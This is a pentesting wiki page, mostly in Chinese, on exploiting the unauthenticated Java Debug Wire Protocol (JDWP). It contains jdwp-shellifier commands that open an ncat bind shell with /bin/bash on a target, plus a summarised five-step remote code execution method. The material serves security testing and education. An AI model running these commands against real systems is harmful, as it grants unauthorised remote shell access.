# Pentesting JDWP - Java Debug Wire Protocol

{{#include ../banners/hacktricks-training.md}}

## 利用

JDWP 利用依赖于 **协议缺乏身份验证和加密**。它通常在 **8000 端口**上找到，但其他端口也是可能的。初始连接是通过向目标端口发送 "JDWP-Handshake" 来建立的。如果 JDWP 服务处于活动状态，它会以相同的字符串响应，确认其存在。此握手作为一种指纹识别方法，用于识别网络上的 JDWP 服务。

在进程识别方面，在 Java 进程中搜索字符串 "jdwk" 可以指示一个活动的 JDWP 会话。

首选工具是 [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier)。您可以使用不同的参数：
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
我发现使用 `--break-on 'java.lang.String.indexOf'` 使得利用更加 **稳定**。如果你有机会将后门上传到主机并执行它，而不是执行命令，利用将会更加稳定。

## 更多细节

**这是[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)的摘要**。请查看以获取更多细节。

1. **JDWP 概述**：

- 这是一种基于数据包的网络二进制协议，主要是同步的。
- 缺乏身份验证和加密，使其在暴露于恶意网络时容易受到攻击。

2. **JDWP 握手**：

- 使用简单的握手过程来启动通信。调试器（客户端）和被调试程序（服务器）之间交换一个14字符的ASCII字符串“JDWP-Handshake”。

3. **JDWP 通信**：

- 消息具有简单的结构，包含长度、ID、标志和命令集等字段。
- 命令集值范围从0x40到0x80，表示不同的操作和事件。

4. **利用**：

- JDWP 允许加载和调用任意类和字节码，带来安全风险。
- 文章详细描述了一个五步的利用过程，包括获取Java运行时引用、设置断点和调用方法。

5. **现实生活中的利用**：

- 尽管可能有防火墙保护，JDWP服务在现实场景中是可发现和可利用的，正如在ShodanHQ和GitHub上的搜索所示。
- 利用脚本已在各种JDK版本上进行了测试，并且是平台无关的，提供可靠的远程代码执行（RCE）。

6. **安全影响**：
- 互联网上开放的JDWP服务的存在强调了定期进行安全审查、在生产环境中禁用调试功能以及适当的防火墙配置的必要性。

### **参考文献：**

- [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
- [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
- [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
- http://www.secdev.org/projects/scapy(不再活跃)
- [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
- http://www.hsc-news.com/archives/2013/000109.html (不再活跃)
- [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
- https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
- [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
- [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
- [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
- [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)


{{#include ../banners/hacktricks-training.md}}
